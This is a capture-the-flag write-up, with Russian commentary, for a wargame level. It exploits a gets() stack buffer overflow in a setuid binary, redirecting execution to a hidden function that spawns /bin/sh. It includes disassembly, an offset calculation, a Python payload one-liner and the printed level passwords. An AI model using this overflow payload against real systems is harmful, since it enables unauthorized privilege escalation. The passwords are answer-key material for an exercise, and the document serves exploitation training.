# su level1
# pass: 1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a

====
Уязвимость: gets, переполняем строку (стек) и заменяем адрес возврата на другую функцию
====

# ls -la
*-rwsr-s---+ 1 level2 users  5138 Mar  6  2016 level1*

# ./level1

**Поведение: ждёт ввода и завершается**

# ltrace ./level1 
   __libc_start_main(0x8048480, 1, 0xbffff804, 0x80484a0, 0x8048510 <unfinished ...>
   gets(0xbffff720, 47, 0xbffff76c, 0xb7fd0ff4, 0x80484a0        
   )                                   = 0xbffff720
   +++ exited (status 32) +++

# gdb level1

# disas main

Dump of assembler code for function main:
   0x08048480 <+0>:     push   %ebp
   0x08048481 <+1>:     mov    %esp,%ebp
   0x08048483 <+3>:     and    $0xfffffff0,%esp
   0x08048486 <+6>:     sub    $0x50,%esp               80
   0x08048489 <+9>:     lea    0x10(%esp),%eax          16 спускаемся от вершины стека(esp)
   0x0804848d <+13>:    mov    %eax,(%esp)
   0x08048490 <+16>:    call   0x8048340 <gets@plt>
   0x08048495 <+21>:    leave  
   0x08048496 <+22>:    ret    
End of assembler dump.

В мейне кроме gets ничего не вызывается. 
gets - уязвимая функция, не проверяет пользовательский ввод (то есть можно кинуть всё, что угодно, и она скушает).
Таким образом, можно подать большую строку и будет сегфолт.
Буфер на 64 (80 минус сдвиг на 16):
b *main+13
r
p/x $esp
p/x $eax 

Возможно, есть другие функции, проверим

# i func
<>
0x08048444  run
0x08048480  main
<>

Есть функция run

# disas run

Dump of assembler code for function run:
   0x08048444 <+0>:     push   %ebp
   0x08048445 <+1>:     mov    %esp,%ebp
   0x08048447 <+3>:     sub    $0x18,%esp               24
   0x0804844a <+6>:     mov    0x80497c0,%eax           stdout
   0x0804844f <+11>:    mov    %eax,%edx
   0x08048451 <+13>:    mov    $0x8048570,%eax          "Good... Wait what?\n"
   0x08048456 <+18>:    mov    %edx,0xc(%esp)            12
   0x0804845a <+22>:    movl   $0x13,0x8(%esp)           19
   0x08048462 <+30>:    movl   $0x1,0x4(%esp)            1
   0x0804846a <+38>:    mov    %eax,(%esp)
   0x0804846d <+41>:    call   0x8048350 <fwrite@plt>
   0x08048472 <+46>:    movl   $0x8048584,(%esp)        "/bin/sh"
   0x08048479 <+53>:    call   0x8048360 <system@plt>
   0x0804847e <+58>:    leave  
   0x0804847f <+59>:    ret    
End of assembler dump.

Видно, что функция вызывает fwrite, а затем открывает шелл.

Теперь необходимо сделать так, чтобы произошло переполнение во время вызова gets и была вызвана функция run.
Для этого, после достижения переполнения, в указатель на функцию возврата прописать адрес 0x08048444 (run) в обратном порядке (от младшего к старшему)
(x/a) $ebp + 4 - адрес возврата у функции
$esp + 0x10 - адрес начала буфера
p $ebp + 4 - ($esp + 0x10)
76 - необходимое количество, чтобы оказаться перед адресом возврата.
+ 4 байта - адрес возврата 

# python -c 'print "A" * 76 + "\x44\x84\x04\x08"' > /tmp/l1

# cat /tmp/l1 - | ./level1

# cat /home/user/level2/.pass

53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
